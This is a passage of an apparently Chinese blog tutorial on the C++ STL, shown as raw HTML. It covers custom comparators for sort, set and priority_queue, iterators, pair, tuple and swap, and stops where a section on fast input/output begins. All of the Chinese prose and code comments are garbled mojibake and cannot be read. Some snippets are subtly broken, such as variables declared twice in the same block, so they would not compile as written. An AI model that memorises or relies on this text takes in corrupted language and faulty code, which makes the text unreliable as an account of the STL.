class="hljs-built_in">sort</span>(vec.<span class="hljs-built_in">begin</span>(), vec.<span class="hljs-built_in">end</span>(), descending);  <span class="hljs-comment">// é™åºæ’åº</span><br><span class="hljs-type">bool</span> found = <span class="hljs-built_in">binary_search</span>(vec.<span class="hljs-built_in">begin</span>(), vec.<span class="hljs-built_in">end</span>(), <span class="hljs-number">3</span>, descending);<br>  <span class="hljs-type">bool</span> found = std::<span class="hljs-built_in">binary_search</span>(v.<span class="hljs-built_in">begin</span>(), v.<span class="hljs-built_in">end</span>(), <span class="hljs-number">3</span>, [](<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b) &#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">abs</span>(a) &lt; <span class="hljs-built_in">abs</span>(b); &#125;);<br><span class="hljs-keyword">if</span> (found) &#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;Element found\n&quot;</span>;  <span class="hljs-comment">// è¾“å‡ºï¼šElement found</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  cout &lt;&lt; <span class="hljs-string">&quot;Element not found\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong><code>set</code></strong> è‡ªå®šä¹‰æ¯”è¾ƒå‡½æ•°ï¼ˆæŒ‰é™åºå­˜å‚¨ï¼‰</p><p>C++ ä¸­çš„ <strong><code>set</code></strong> é»˜è®¤æ˜¯å‡åºæ’åºã€‚æˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰ä¸€ä¸ªæ¯”è¾ƒå‡½æ•°æ¥æ”¹å˜æ’åºé¡ºåºã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// è‡ªå®šä¹‰æ¯”è¾ƒå‡½æ•°ï¼ŒæŒ‰é™åºæ’åº</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Descending</span> &#123;<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">operator</span><span class="hljs-params">()</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> <span class="hljs-type">const</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> a &gt; b;<br>    &#125;<br>&#125;;<br>set&lt;<span class="hljs-type">int</span>, Descending&gt; s = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br>set&lt;<span class="hljs-type">int</span>, <span class="hljs-keyword">decltype</span>([](<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b) &#123; <span class="hljs-keyword">return</span> a &gt; b; &#125;)&gt; <span class="hljs-built_in">s</span>([](<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b) &#123; <span class="hljs-keyword">return</span> a &gt; b; &#125;);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> v : s) &#123;<br>     cout &lt;&lt; v &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;  <span class="hljs-comment">// è¾“å‡ºï¼š5 4 3 2 1</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong><code>priority_queue</code></strong> è‡ªå®šä¹‰æ¯”è¾ƒå‡½æ•°ï¼ˆå®ç°å°é¡¶å †ï¼‰</p><p><code>priority_queue</code> é»˜è®¤æ˜¯å¤§é¡¶å †ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è‡ªå®šä¹‰æ¯”è¾ƒå‡½æ•°åˆ›å»ºå°é¡¶å †ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// è‡ªå®šä¹‰æ¯”è¾ƒå‡½æ•°ï¼Œå®ç°å°é¡¶å †</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Compare</span> &#123;<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">operator</span><span class="hljs-params">()</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> a &gt; b;  <span class="hljs-comment">// ä½¿è¾ƒå°çš„å…ƒç´ æ‹¥æœ‰æ›´é«˜ä¼˜å…ˆçº§</span><br>    &#125;<br>&#125;;<br><br>priority_queue&lt;<span class="hljs-type">int</span>, std::vector&lt;<span class="hljs-type">int</span>&gt;, Compare&gt; pq;<br>pq.<span class="hljs-built_in">push</span>(<span class="hljs-number">5</span>);<br>pq.<span class="hljs-built_in">push</span>(<span class="hljs-number">1</span>);<br>pq.<span class="hljs-built_in">push</span>(<span class="hljs-number">3</span>);<br><span class="hljs-keyword">while</span> (!pq.<span class="hljs-built_in">empty</span>()) &#123;<br>    cout &lt;&lt; pq.<span class="hljs-built_in">top</span>() &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;  <span class="hljs-comment">// è¾“å‡ºï¼š1 3 5</span><br>    pq.<span class="hljs-built_in">pop</span>();<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="å››ã€è¿­ä»£å™¨-Iterators"><a href="#å››ã€è¿­ä»£å™¨-Iterators" class="headerlink" title="å››ã€è¿­ä»£å™¨ (Iterators)"></a>å››ã€è¿­ä»£å™¨ (Iterators)</h4><p>è¿­ä»£å™¨æä¾›äº†ä¸€ç§ç»Ÿä¸€çš„æ–¹å¼æ¥éå† STL å®¹å™¨ã€‚å¸¸è§çš„è¿­ä»£å™¨ç±»å‹æœ‰ï¼š</p><ul><li><code>begin()</code> å’Œ <code>end()</code>ï¼šè¿”å›æŒ‡å‘å®¹å™¨ç¬¬ä¸€ä¸ªå…ƒç´ å’Œå°¾åå…ƒç´ çš„è¿­ä»£å™¨ã€‚</li><li><code>rbegin()</code> å’Œ <code>rend()</code>ï¼šè¿”å›é€†åºè¿­ä»£å™¨ï¼Œåˆ†åˆ«æŒ‡å‘æœ€åä¸€ä¸ªå…ƒç´ å’Œç¬¬ä¸€ä¸ªå…ƒç´ ä¹‹å‰çš„ä½ç½®ã€‚</li><li><code>cbegin()</code> å’Œ <code>cend()</code>ï¼šè¿”å›å¸¸é‡è¿­ä»£å™¨ï¼Œä¸èƒ½ç”¨äºä¿®æ”¹å…ƒç´ ã€‚</li></ul><p>è¿­ä»£å™¨å¯ä»¥é€šè¿‡ <code>*it</code> è§£å¼•ç”¨è®¿é—®å…ƒç´ ï¼Œé€šè¿‡ <code>++it</code> æˆ– <code>--it</code> ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªæˆ–ä¸Šä¸€ä¸ªå…ƒç´ ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-type">int</span> age;<br>    string name;<br>    <span class="hljs-built_in">Person</span>(<span class="hljs-type">int</span> age, string name) : <span class="hljs-built_in">age</span>(age), <span class="hljs-built_in">name</span>(name) &#123;&#125;<br>&#125;;<br><br><span class="hljs-comment">// è‡ªå®šä¹‰æ¯”è¾ƒå‡½æ•°</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">CompareAge</span> &#123;<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">operator</span><span class="hljs-params">()</span><span class="hljs-params">(<span class="hljs-type">const</span> Person&amp; p1, <span class="hljs-type">const</span> Person&amp; p2)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> p<span class="hljs-number">1.</span>age &gt; p<span class="hljs-number">2.</span>age;  <span class="hljs-comment">// æŒ‰ç…§å¹´é¾„å‡åºæ’åˆ—ï¼ˆæœ€å°å †ï¼‰</span><br>    &#125;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// ä½¿ç”¨è‡ªå®šä¹‰æ¯”è¾ƒå‡½æ•° CompareAgeï¼ˆæœ€å°å †ï¼‰</span><br>    priority_queue&lt;Person, vector&lt;Person&gt;, CompareAge&gt; pq;<br>    pq.<span class="hljs-built_in">push</span>(<span class="hljs-built_in">Person</span>(<span class="hljs-number">25</span>, <span class="hljs-string">&quot;Alice&quot;</span>));<br>    pq.<span class="hljs-built_in">push</span>(<span class="hljs-built_in">Person</span>(<span class="hljs-number">30</span>, <span class="hljs-string">&quot;Bob&quot;</span>));<br>    pq.<span class="hljs-built_in">push</span>(<span class="hljs-built_in">Person</span>(<span class="hljs-number">20</span>, <span class="hljs-string">&quot;Charlie&quot;</span>));<br>    <span class="hljs-comment">// è¾“å‡ºå †é¡¶å…ƒç´ ï¼ˆæœ€å°å¹´é¾„ï¼‰</span><br>    cout &lt;&lt; <span class="hljs-string">&quot;Top person: &quot;</span> &lt;&lt; pq.<span class="hljs-built_in">top</span>().name &lt;&lt; <span class="hljs-string">&quot;, Age: &quot;</span> &lt;&lt; pq.<span class="hljs-built_in">top</span>().age &lt;&lt; endl;  <span class="hljs-comment">// è¾“å‡º Charlie, 20</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="äº”-è¾…åŠ©å·¥å…·ç±»ï¼ˆUtility-Componentsï¼‰"><a href="#äº”-è¾…åŠ©å·¥å…·ç±»ï¼ˆUtility-Componentsï¼‰" class="headerlink" title="äº”.è¾…åŠ©å·¥å…·ç±»ï¼ˆUtility Componentsï¼‰"></a>äº”.è¾…åŠ©å·¥å…·ç±»ï¼ˆUtility Componentsï¼‰</h4><ul><li><strong>æ•°æ®ç»“æ„</strong>ï¼š<code>pair</code>ã€<code>tuple</code>ã€<code>make_pair</code>ã€<code>make_tuple</code></li><li><strong>äº¤æ¢å’Œå¼•ç”¨</strong>ï¼š<code>swap</code></li></ul><p><strong><code>pair</code> çš„åŸºæœ¬ä½¿ç”¨</strong></p><p><code>pair</code> çš„å®šä¹‰åœ¨ <code>&lt;utility&gt;</code> å¤´æ–‡ä»¶ä¸­ï¼Œé€šå¸¸ç”¨ <code>std::make_pair</code> å‡½æ•°æ¥åˆ›å»ºä¸€ä¸ª <code>pair</code>ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨æ„é€ å‡½æ•°ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// ä½¿ç”¨ make_pair å‡½æ•°åˆ›å»ºä¸€ä¸ª pair</span><br>pair&lt;std::string, <span class="hljs-type">int</span>&gt; student = <span class="hljs-built_in">make_pair</span>(<span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-number">23</span>);<br><span class="hljs-comment">// è®¿é—® pair ä¸­çš„å…ƒç´ </span><br>cout &lt;&lt; <span class="hljs-string">&quot;Name: &quot;</span> &lt;&lt; student.first &lt;&lt; <span class="hljs-string">&quot;, Age: &quot;</span> &lt;&lt; student.second &lt;&lt; endl;<br><span class="hljs-comment">// ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨æ„é€ å‡½æ•°åˆå§‹åŒ– pair</span><br><span class="hljs-function">pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">double</span>&gt; <span class="hljs-title">score</span><span class="hljs-params">(<span class="hljs-number">1</span>, <span class="hljs-number">98.5</span>)</span></span>;<br>cout &lt;&lt; <span class="hljs-string">&quot;Rank: &quot;</span> &lt;&lt; score.first &lt;&lt; <span class="hljs-string">&quot;, Score: &quot;</span> &lt;&lt; score.second &lt;&lt;endl;<br><br></code></pre></td></tr></table></figure><p><strong><code>pair</code> çš„æˆå‘˜</strong></p><ul><li><code>first</code>: è¡¨ç¤º <code>pair</code> ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚</li><li><code>second</code>: è¡¨ç¤º <code>pair</code> ä¸­çš„ç¬¬äºŒä¸ªå…ƒç´ ã€‚</li></ul><p>å¯ä»¥é€šè¿‡ <code>pair.first</code> å’Œ <code>pair.second</code> åˆ†åˆ«è®¿é—®ä¸¤ä¸ªå€¼ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">char</span>&gt; <span class="hljs-title">p</span><span class="hljs-params">(<span class="hljs-number">10</span>, <span class="hljs-string">&#x27;A&#x27;</span>)</span></span>;  <span class="hljs-comment">// åˆå§‹åŒ–pairï¼Œç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯intï¼Œç¬¬äºŒä¸ªæ˜¯char</span><br>cout &lt;&lt; <span class="hljs-string">&quot;First: &quot;</span> &lt;&lt; p.first &lt;&lt; endl;  <span class="hljs-comment">// è¾“å‡º10</span><br>cout &lt;&lt; <span class="hljs-string">&quot;Second: &quot;</span> &lt;&lt; p.second &lt;&lt; endl;  <span class="hljs-comment">// è¾“å‡º&#x27;A&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>ä¸å®¹å™¨ç»“åˆä½¿ç”¨</strong></p><p><code>pair</code> åœ¨ STL å®¹å™¨ä¸­éå¸¸å¸¸ç”¨ï¼Œç‰¹åˆ«æ˜¯åœ¨å…³è”å®¹å™¨ï¼ˆå¦‚ <code>map</code> å’Œ <code>set</code>ï¼‰ä¸­ï¼Œ<code>pair</code> ç”¨äºè¡¨ç¤ºé”®å€¼å¯¹ã€‚åœ¨ <code>map</code> ä¸­ï¼Œé”®å€¼å¯¹çš„æ¯ä¸ªå…ƒç´ å®é™…ä¸Šæ˜¯ä¸€ä¸ª <code>pair</code>ï¼Œå…¶ä¸­ <code>first</code> æ˜¯é”®ï¼Œ<code>second</code> æ˜¯å€¼ã€‚</p><p>åœ¨ <code>map</code> ä¸­ä½¿ç”¨ <code>pair</code>ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// åˆ›å»ºä¸€ä¸ª map æ¥å­˜å‚¨å­¦ç”Ÿå§“åå’Œåˆ†æ•°</span><br>map&lt;string, <span class="hljs-type">int</span>&gt; studentScores;<br><span class="hljs-comment">// æ’å…¥é”®å€¼å¯¹ï¼Œä½¿ç”¨ make_pair å‡½æ•°</span><br>studentScores.<span class="hljs-built_in">insert</span>(<span class="hljs-built_in">make_pair</span>(<span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-number">90</span>));<br>studentScores.<span class="hljs-built_in">insert</span>(<span class="hljs-built_in">make_pair</span>(<span class="hljs-string">&quot;Bob&quot;</span>, <span class="hljs-number">85</span>));<br><span class="hljs-comment">// è®¿é—® map ä¸­çš„å…ƒç´ </span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; entry : studentScores) &#123;<br>   cout &lt;&lt; <span class="hljs-string">&quot;Name: &quot;</span> &lt;&lt; entry.first &lt;&lt; <span class="hljs-string">&quot;, Score: &quot;</span> &lt;&lt; entry.second &lt;&lt; endl;<br>&#125;<br><span class="hljs-comment">// ä¹Ÿå¯ä»¥é€šè¿‡ [] æ“ä½œç¬¦ç›´æ¥è®¿é—®é”®å€¼å¯¹</span><br>studentScores[<span class="hljs-string">&quot;Charlie&quot;</span>] = <span class="hljs-number">88</span>;<br>cout &lt;&lt; <span class="hljs-string">&quot;Charlie&#x27;s Score: &quot;</span> &lt;&lt; studentScores[<span class="hljs-string">&quot;Charlie&quot;</span>] &lt;&lt; endl;<br></code></pre></td></tr></table></figure><p><strong>æ¯”è¾ƒ <code>pair</code></strong></p><p><code>pair</code> æ”¯æŒæ¯”è¾ƒæ“ä½œï¼ˆå¦‚ <code>==</code>ã€<code>!=</code>ã€<code>&lt;</code>ã€<code>&gt;</code> ç­‰ï¼‰ã€‚æ¯”è¾ƒè§„åˆ™æ˜¯å…ˆæ¯”è¾ƒ <code>first</code> å…ƒç´ ï¼Œå¦‚æœ <code>first</code> ç›¸ç­‰ï¼Œåˆ™æ¯”è¾ƒ <code>second</code> å…ƒç´ ã€‚</p><p>ç¤ºä¾‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>)</span></span>;<br><span class="hljs-function">pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; <span class="hljs-title">p2</span><span class="hljs-params">(<span class="hljs-number">10</span>, <span class="hljs-number">30</span>)</span></span>;<br><span class="hljs-keyword">if</span> (p1 &lt; p2) &#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;p1 is less than p2&quot;</span> &lt;&lt; endl;  <span class="hljs-comment">// æ¯”è¾ƒçš„æ˜¯ firstï¼Œè‹¥ç›¸ç­‰ï¼Œåˆ™æ¯”è¾ƒ second</span><br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<code>p1</code> å’Œ <code>p2</code> çš„ <code>first</code> éƒ¨åˆ†ç›¸åŒï¼Œæ¯”è¾ƒç»“æœå–å†³äº <code>second</code> éƒ¨åˆ†ã€‚</p><p><strong><code>pair</code> çš„å¸¸è§ç”¨æ³•</strong></p><p><strong>ä½œä¸ºå‡½æ•°çš„è¿”å›å€¼</strong>ï¼šå½“ä½ éœ€è¦ä»å‡½æ•°ä¸­è¿”å›å¤šä¸ªå€¼æ—¶ï¼Œ<code>pair</code> å¯ä»¥ä½œä¸ºæ–¹ä¾¿çš„ç»“æ„ä½“æ¥è¿”å›ä¸¤ä¸ªå€¼ï¼Œè€Œä¸éœ€è¦åˆ›å»ºä¸“é—¨çš„ç»“æ„ä½“ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; <span class="hljs-title">getMinMax</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (a &lt; b) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">make_pair</span>(a, b);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">make_pair</span>(b, a);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">auto</span> result = <span class="hljs-built_in">getMinMax</span>(<span class="hljs-number">5</span>, <span class="hljs-number">10</span>);<br>cout &lt;&lt; <span class="hljs-string">&quot;Min: &quot;</span> &lt;&lt; result.first &lt;&lt; <span class="hljs-string">&quot;, Max: &quot;</span> &lt;&lt; result.second &lt;&lt; endl;<br></code></pre></td></tr></table></figure><p><strong><code>tuple</code> ä½œä¸ºæ‰©å±•</strong></p><p><code>pair</code> åªèƒ½å­˜å‚¨ä¸¤ä¸ªç›¸å…³è”çš„å€¼ã€‚å¦‚æœä½ éœ€è¦å­˜å‚¨æ›´å¤šçš„å€¼ï¼Œå¯ä»¥ä½¿ç”¨ C++11 å¼•å…¥çš„ <code>tuple</code>ï¼Œå®ƒæ˜¯ <code>pair</code> çš„æ‰©å±•ç‰ˆï¼Œå¯ä»¥å­˜å‚¨ä»»æ„å¤šä¸ªå…ƒç´ ã€‚</p><p>ç¤ºä¾‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">tuple&lt;<span class="hljs-type">int</span>, <span class="hljs-built_in">string</span>, <span class="hljs-type">double</span>&gt; <span class="hljs-title function_">t</span><span class="hljs-params">(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-number">90.5</span>)</span>;<br><span class="hljs-comment">// è®¿é—® tuple ä¸­çš„å…ƒç´ </span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;ID: &quot;</span> &lt;&lt; get&lt;<span class="hljs-number">0</span>&gt;(t) &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Name: &quot;</span> &lt;&lt; get&lt;<span class="hljs-number">1</span>&gt;(t) &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Score: &quot;</span> &lt;&lt;get&lt;<span class="hljs-number">2</span>&gt;(t) &lt;&lt; <span class="hljs-built_in">endl</span>;<br></code></pre></td></tr></table></figure><p><code>tuple</code> å¯ä»¥é€šè¿‡ <code>get&lt;index&gt;</code> æ¥è®¿é—®æ¯ä¸ªå…ƒç´ ï¼Œå¹¶ä¸”å¯ä»¥å­˜å‚¨ä»»æ„æ•°é‡å’Œç±»å‹çš„å…ƒç´ ã€‚</p><p><strong><code>pair</code>ï¼šä¸€å¯¹æ•°æ®å­˜å‚¨</strong></p><p><strong>åŠŸèƒ½ï¼š</strong> å­˜å‚¨ä¸¤ä¸ªä¸åŒç±»å‹çš„æ•°æ®å¯¹ï¼Œå¸¸ç”¨äº <strong><code>map</code></strong> ä¸­çš„é”®å€¼å¯¹å­˜å‚¨ã€‚</p><p><strong>å¤´æ–‡ä»¶ï¼š</strong> <code>&lt;utility&gt;</code></p><p>ç¤ºä¾‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">pair</span>&lt;<span class="hljs-type">int</span>, <span class="hljs-built_in">string</span>&gt; p = <span class="hljs-built_in">make_pair</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;apple&quot;</span>);<br><span class="hljs-built_in">cout</span> &lt;&lt; p.first &lt;&lt; <span class="hljs-string">&quot;, &quot;</span> &lt;&lt; p.second &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;  <span class="hljs-comment">// è¾“å‡ºï¼š1, apple</span><br></code></pre></td></tr></table></figure><p><code>tuple</code>ï¼šå¤šæ•°æ®å­˜å‚¨</p><p><strong>åŠŸèƒ½ï¼š</strong> å¯å­˜å‚¨ä»»æ„æ•°é‡ã€ä»»æ„ç±»å‹çš„å…ƒç´ ï¼Œæ¯” <code>pair</code> æ›´çµæ´»ã€‚</p><p><strong>å¤´æ–‡ä»¶ï¼š</strong> <code>&lt;tuple&gt;</code></p><p>ç¤ºä¾‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> t = make_tuple(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;apple&quot;</span>, <span class="hljs-number">3.14</span>);<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">std</span>::get&lt;<span class="hljs-number">0</span>&gt;(t) &lt;&lt; <span class="hljs-string">&quot;, &quot;</span> &lt;&lt; get&lt;<span class="hljs-number">1</span>&gt;(t) &lt;&lt; <span class="hljs-string">&quot;, &quot;</span> &lt;&lt; get&lt;<span class="hljs-number">2</span>&gt;(t) &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-comment">// è¾“å‡ºï¼š1, apple, 3.14</span><br></code></pre></td></tr></table></figure><p><strong><code>make_pair</code> å’Œ <code>make_tuple</code>ï¼šç®€åŒ–å¯¹è±¡åˆ›å»º</strong></p><p><strong>åŠŸèƒ½ï¼š</strong> åˆ†åˆ«ç”¨äºåˆ›å»º <code>pair</code> å’Œ <code>tuple</code>ï¼Œè‡ªåŠ¨æ¨å¯¼ç±»å‹ï¼Œç®€åŒ–ä»£ç ã€‚</p><p><strong>å¤´æ–‡ä»¶ï¼š</strong> <code>&lt;utility&gt;</code>, <code>&lt;tuple&gt;</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> p = <span class="hljs-built_in">make_pair</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;banana&quot;</span>);<br><span class="hljs-keyword">auto</span> t = make_tuple(<span class="hljs-number">1</span>, <span class="hljs-number">2.5</span>, <span class="hljs-string">&quot;orange&quot;</span>);<br></code></pre></td></tr></table></figure><p><code>swap</code>ï¼šäº¤æ¢ä¸¤ä¸ªå¯¹è±¡çš„å€¼</p><p><strong>åŠŸèƒ½ï¼š</strong> ç”¨äºäº¤æ¢ä¸¤ä¸ªå¯¹è±¡çš„å†…å®¹ã€‚</p><p><strong>å¤´æ–‡ä»¶ï¼š</strong> <code>&lt;utility&gt;</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> a = <span class="hljs-number">10</span>, b = <span class="hljs-number">20</span>;<br>swap(a, b);  <span class="hljs-comment">// a å˜ä¸º 20ï¼Œb å˜ä¸º 10</span><br></code></pre></td></tr></table></figure><hr><h3 id="5-ä¼˜åŒ–æŠ€å·§"><a href="#5-ä¼˜åŒ–æŠ€å·§" class="headerlink" title="5.ä¼˜åŒ–æŠ€å·§"></a>5.ä¼˜åŒ–æŠ€å·§</h3><p>åœ¨ç®—æ³•ç«èµ›ä¸­ï¼Œä¸ºäº†ç¼–å†™ç®€æ´é«˜æ•ˆçš„ä»£ç ï¼Œäº‰å–æ—¶é—´å¹¶å‡å°‘è¾“å…¥è¾“å‡ºçš„ç¹çæ­¥éª¤ï¼Œå¸¸è§çš„ç®€ä¾¿æ“ä½œå¯ä»¥å¸®åŠ©ä½ åœ¨ç´§å¼ çš„æ¯”èµ›ç¯å¢ƒä¸­æé«˜ç¼–å†™å’Œæ‰§è¡Œä»£ç çš„æ•ˆç‡ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„ç®€ä¾¿æ“ä½œå’Œä¼˜åŒ–æŠ€å·§ï¼š</p><h4 id="1-å¿«é€Ÿè¾“å…¥è¾“å‡º"><a href="#1-å¿«é€Ÿè¾“å…¥è¾“å‡º" class="headerlink" title="1. å¿«é€Ÿè¾“å…¥è¾“å‡º"></a>1. <strong>å¿«é€Ÿè¾“å…¥è¾“å‡º</strong></h4><p>æœ€å¥½æ¯ä¸ªéƒ½å†™ä¸Š</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">ios::sync_with_stdio(<span class="hljs-literal">false</span>);<br><span class="hljs-built_in">cin</span>.tie(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">cout</span>.tie(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h4 id="2-ä½¿ç”¨å®å®šä¹‰å‡å°‘ä»£ç é‡"><a href="#2-ä½¿ç”¨å®å®šä¹‰å‡å°‘ä»£ç é‡" class="headerlink" title="2.ä½¿ç”¨å®å®šä¹‰å‡å°‘ä»£ç 